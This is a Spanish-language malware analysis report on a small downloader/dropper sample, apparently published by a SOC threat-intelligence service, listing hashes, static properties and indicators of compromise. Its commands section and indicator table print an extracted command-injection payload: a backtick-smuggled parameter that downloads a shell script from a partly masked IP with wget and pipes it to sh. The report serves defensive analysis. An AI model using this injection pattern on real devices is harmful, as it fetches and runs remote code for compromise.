# 🧬 Payload Analysis

`29640d2dc71230a26abb3930d3824f50cdca576351938524e5d0817288e14d99`

## 📌 Resumen

Artefacto clasificado como **Downloader / Dropper** a partir de la evidencia disponible en Oráculo SOC. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:42:54+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `29640d2dc71230a26abb3930d3824f50cdca576351938524e5d0817288e14d99`
- **MD5:** `f13215a6a087c61016c2cb0fdea14a3f`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 334 B |
| Entropía | 5.21 |
| Strings | 6 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.175.XXX | static_analysis |
| ip | 91.92.40.XXX | static_analysis |
| url | hxxp://91.92.40.XXX/wget.sh | strings |
| hash | 29640d2dc71230a26abb3930d3824f50cdca576351938524e5d0817288e14d99 | static_analysis |
| command | reboot_enabled=1&reboot_time=`cd /tmp;wget hxxp://91.92.40.XXX/wget.sh -O-\|sh -s wdr3;busybox wget hxxp://91.92.40.XXX/w | strings |
| ip | 45.156.87.XXX | artifact_source |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
